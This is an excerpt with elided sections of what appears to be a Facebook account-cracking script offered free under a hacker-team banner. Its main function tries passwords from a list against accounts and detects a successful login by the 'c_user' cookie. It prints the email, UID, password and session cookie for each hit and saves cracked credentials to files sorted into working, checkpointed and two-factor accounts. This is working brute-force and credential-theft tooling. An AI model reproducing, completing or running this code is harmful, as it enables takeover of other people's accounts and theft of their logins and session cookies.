...
\033[1;37m[*] Author        : ABU BAKAR

\033[1;37m[*] Status        : FREE

\033[1;37m[*] TEAM          :ALONE TOPPER 
...
def xyz():
    ...
    #os.system("play-audio WELCOME_TO_jhalla_zone_818.mp3")
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[âˆš]---------------------[iTx JHALLA Power-OK]--------------------[âˆš]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\nCOOKIE   : '+coki+'\n[âˆš]---------------------------------------------------[âˆš]')

                cek_apk(session,coki)

                open('/sdcard/iTx JHALLA Power-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                print(f'\r{Red}[Ã—]--------------------[iTx JHALLA Power-OK]---------------------[Ã—]\nEMAIL : '+uid+'\nUID   : '+cid+' âˆš '+ps+ '\n[Ã—]---------------------------------------------------[Ã—]\033[1;97m')

                open('/sdcard/iTx JHALLA Power-CP.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('/sdcard/iTx JHALLAPower-2F.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[iTx JHALLA Power] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
